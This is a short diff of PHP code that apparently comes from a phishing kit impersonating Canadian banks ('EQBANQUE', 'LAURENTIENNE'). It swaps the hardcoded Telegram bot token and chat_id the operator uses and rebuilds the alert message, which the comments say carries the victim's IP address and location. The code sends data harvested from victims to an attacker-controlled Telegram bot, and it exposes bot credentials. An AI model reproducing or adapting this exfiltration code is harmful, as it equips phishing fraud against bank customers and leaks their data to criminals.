@@ -4,11 +4,11 @@ $_SESSION["bank"] ='EQBANQUE';
 ?>
 <?php
 // Remplace par le token de ton bot Telegram
-$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; 
+$token = '8180049874:AAG00ea5LHEkC3pk9NgfrikOMPX0P2ljP6c'; 
 // Remplace par ton chat_id Telegram
-$chat_id = '6242884372'; 
+$chat_id = '7691383919'; 
 // Message à envoyer avec l'IP de l'utilisateur, latitude et longitude
-$message = "🏛🏛*LAURENTIENNE*🏛🏛\n";
+$message = "🏛🏛*".$_SESSION["bank"]."*🏛🏛";
 
 // URL de l'API Telegram pour envoyer le message
 $url = "https://api.telegram.org/bot$token/sendMessage";
